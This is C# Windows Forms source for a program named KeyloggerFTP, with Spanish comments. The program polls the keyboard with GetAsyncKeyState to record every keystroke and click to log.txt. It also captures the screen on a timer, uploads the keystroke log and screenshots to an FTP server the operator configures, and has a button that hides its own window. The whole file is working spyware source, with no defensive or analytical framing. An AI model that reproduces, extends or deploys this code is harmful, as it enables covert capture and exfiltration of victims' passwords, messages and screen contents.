﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Runtime.InteropServices;//librerias necesarios para capturar
using System.IO;
using System.Drawing.Imaging; //para tomar capturas

using System.Net;

namespace KeyloggerFTP
{

    public partial class Form1 : Form
    {
        
        Boolean screenShot = false;
        String Servidor;
        String Usuario;
        String Password;
        int Estado = 0;
        String Directorio;
        int c = 0;// contador para las capturas de pantalla
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        string texto = "";
        string buffer = "";
        String letras = "";
        string temp = "";
        String Archivo = "";
        int Tiempo = 5000;
       
       
        private void archivo(string txt)
        {
            
            StreamWriter stream = new StreamWriter("log.txt", true);

            stream.Write(txt);

            stream.Close();


        }

        public Form1()
        {
            
            InitializeComponent();
            textBox1.Text = "0";
            textBox2.Text = "0";
            textBox3.Text = "0";
            screenShot = false;
            groupBox.Enabled = false;
            if (Estado == 1)
            {
                label6.Text = "ENCENDIDO";
            }
            else
            {
                label6.Text = "APAGADO";
            }
            
        }

        public void Form1_Load(object sender, EventArgs e)
        {

            B_Apagar.Visible = false;


        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            Servidor = T_servidor.Text;
            Usuario = T_Usuario.Text;
            Password = T_password.Text;
        }

        private void B_Encender_Click(object sender, EventArgs e)
        {
          
            tomarFotos.Enabled = false;
            B_Encender.Visible = false;
            groupBox.Enabled = false;
            B_Apagar.Visible = true;
            Estado = 1;
            label6.Text = "ENCENDIDO";
        }

        private void B_Apagar_Click(object sender, EventArgs e)
        {
            tomarFotos.Enabled = true;
            B_Apagar.Visible = false;
            groupBox.Enabled = true;
            B_Encender.Visible = true;
            Estado = 0;
            label6.Text = "APAGADO";
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            Servidor = T_servidor.Text; //probablemente esta linea es inutil

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            Usuario = T_Usuario.Text;  //probablemente esta linea es inutil
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
            Password = T_password.Text;  //probablemente esta linea es inutil
        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            
            if (Estado == 1 || Estado == 2)
            {
                foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {



                        temp = Enum.GetName(typeof(Keys), i);




                        switch (Enum.GetName(typeof(Keys), i))
                        {

                            case "Space":
                                buffer += " ";
                                break;
                            case "Enter":
                                //buffer += "\r\n";
                                buffer += " [<|] ";
                                break;
                            case "LButton":
                                //Click Izquierdo
                                buffer += " [CI] ";
                                break;
                            case "Back":
                                //Boton de borrado 
                                buffer += "";
                                break;
                            case "Oemcomma":
                                //Coma, 
                                buffer += ",";
                                break;
                            case "OemPeriod":
                                //Punto. 
                                buffer += ".";
                                break;
                            case "NumPad0":

                                buffer += "0";
                                break;
                            case "NumPad1":

                                buffer += "1";
                                break;
                            case "NumPad2":

                                buffer += "2";
                                break;
                            case "NumPad3":

                                buffer += "3";
                                break;
                            case "NumPad4":

                                buffer += "4";
                                break;

                            case "NumPad5":

                                buffer += "5";
                                break;
                            case "NumPad6":

                                buffer += "6";
                                break;
                            case "NumPad7":

                                buffer += "7";
                                break;
                            case "NumPad8":

                                buffer += "8";
                                break;
                            case "NumPad9":

                                buffer += "9";
                                break;
                            case "D0":

                                buffer += "0";
                                break;
                            case "D1":

                                buffer += "1";
                                break;
                            case "D2":

                                buffer += "2";
                                break;
                            case "D3":

                                buffer += "3";
                                break;

                            case "D4":

                                buffer += "4";
                                break;
                            case "D5":

                                buffer += "5";
                                break;
                            case "D6":

                                buffer += "6";
                                break;
                            case "D7":

                                buffer += "7";
                                break;
                            case "D8":

                                buffer += "8";
                                break;
                            case "D9":

                                buffer += "9";
                                break;

                            default:
                                buffer += Enum.GetName(typeof(Keys), i);
                                break;
                        }




                    }

                }

                texto = buffer;

                if (texto.Length > 1)
                {
                    archivo(texto);
                    texto = "";
                    buffer = "";
                }
            }
        }

        public void screenshot(string nombre)
        {
            try
            {


                int wid = Screen.GetBounds(new Point(0, 0)).Width;
                int he = Screen.GetBounds(new Point(0, 0)).Height;
                Bitmap now = new Bitmap(wid, he);
                Graphics grafico = Graphics.FromImage((Image)now);
                grafico.CopyFromScreen(0, 0, 0, 0, new Size(wid, he));
                now.Save(nombre, ImageFormat.Jpeg);
            }
            catch
            {
                Console.WriteLine("Algo malo ocurrio xc");
            }

        }

        public void FTP_Upload(string servidor, string usuario, string password, string archivo)
        {


            try
            {
                WebClient ftp = new System.Net.WebClient(); // Iniciamos una instancia WebClient con "ftp"
                ftp.Credentials = new System.Net.NetworkCredential(usuario, password); // Establecemos el login

                FileInfo dividir = new FileInfo(archivo); // Iniciamos una instancia FileInfo con "dividir"
                string solo_nombre = dividir.Name; // Capturamos solo el nombre de la ruta del archivo de "archivo"

                ftp.UploadFile("ftp://" + servidor + "/" + solo_nombre, "STOR", archivo);

            }
            catch
            {
                //
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            //Aqui se implementara parte de la funcion de ftp
            if (Estado == 1)
            {
                FTP_Upload(Servidor, Usuario, Password, "log.txt");
            }


        }

        private void label5_Click_1(object sender, EventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
        {
            //aqui ira el codigo de una funcion para que el usuario pueda elegir la ruta de guardado del archivo
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Visible = false; //boton oculatar
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            timer3.Interval = Tiempo;
            if (screenShot == true)
            {
                if (Estado == 1)
                {
                    //string fecha = DateTime.Now.ToString("dd:MM:yy:h:mm:ss tt");
                    //string nombrefinal = fecha.Trim() + ".jpg";
                    //string Archivo = nombrefinal.Replace(":", "_");

                    screenshot("test.jpg");

                    FTP_Upload(Servidor, Usuario, Password, "test.jpg");
                    System.IO.File.Delete("test.jpg");
                }
                if (Estado == 2)
                {
                    string fecha = DateTime.Now.ToString("dd:MM:yy:h:mm:ss tt");
                    string nombrefinal = fecha.Trim() + ".jpg";
                    string Archivo = nombrefinal.Replace(":", "_");

                    screenshot(Archivo);
                    //System.IO.File.Delete(Archivo);
                }

            }

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Estado = 2;
            T_servidor.Visible = false;
            T_Usuario.Visible = false;
            T_password.Visible = false;
            label2.Visible = false;
            label3.Visible = false;
            label4.Visible = false;
            B_Guardar.Visible = false;
            button2.Visible = false;
            
        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void tomarFotos_CheckedChanged(object sender, EventArgs e)
        {
            if (tomarFotos.Checked)
            {
                screenShot = true;
                groupBox.Enabled = true;
            }
            else
            {
                screenShot = false;
                groupBox.Enabled = false;
            }

        }

        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {
            
        }

        private void textBox2_TextChanged_1(object sender, EventArgs e)
        {
            
        }

        private void textBox3_TextChanged_1(object sender, EventArgs e)
        {
            
        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            Tiempo = (Convert.ToInt32(textBox1.Text) * 3600000) + (Convert.ToInt32(textBox2.Text) * 60000) + (Convert.ToInt32(textBox3.Text) * 1000);
        }

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }
    }
}
